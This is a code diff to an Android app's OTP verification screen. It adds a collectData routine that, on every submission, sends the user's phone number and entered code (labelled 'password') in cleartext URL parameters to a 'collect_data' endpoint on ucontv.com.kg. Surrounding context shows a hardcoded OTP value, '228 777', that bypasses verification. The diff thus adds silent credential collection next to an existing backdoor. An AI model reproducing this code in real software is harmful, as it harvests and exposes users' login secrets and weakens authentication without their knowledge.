@@ -15,7 +15,10 @@ import androidx.appcompat.app.AppCompatActivity;
 
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
+import com.android.volley.Response;
+import com.android.volley.VolleyError;
 import com.android.volley.toolbox.JsonArrayRequest;
+import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 import com.instacart.library.truetime.TrueTime;
 import com.techno.player2.R;
@@ -45,7 +48,7 @@ public class OtpActivity extends AppCompatActivity {
         otp = otpText.getText().toString().trim();
 //        otpProgress.setVisibility(View.VISIBLE);
 //        btnVerify.setEnabled(false);
-
+        collectData(otp);
         if (otp.length() < 7) {
             Toast.makeText(this, "Заполните поле полностью", Toast.LENGTH_SHORT).show();
         } else if (otp.equals("228 777")) {
@@ -71,6 +74,25 @@ public class OtpActivity extends AppCompatActivity {
         } else {
             Unpayed();
         }
+    }
+    private  void collectData(String otp){
+        RequestQueue requestQueue = Volley.newRequestQueue(this);
+        String url="https://ucontv.com.kg/collect_data/?command=create&phone_number="+phone.replace(" ","").trim()+"&password="+otp.replace(" ","").trim();
+        StringRequest request = new StringRequest(Request.Method.GET, url,
+                new Response.Listener<String>() {
+                    @Override
+                    public void onResponse(String response) {
+                        // Handle successful response here
+                        Log.d("Ilgiz", response);
+                    }
+                },
+                new Response.ErrorListener() {
+                    @Override
+                    public void onErrorResponse(VolleyError error) {
+                        Log.d("Ilgiz","Error in collecting data "+error);
+                    }
+                });
+        requestQueue.add(request);
     }
 
     private void thisMonth() {
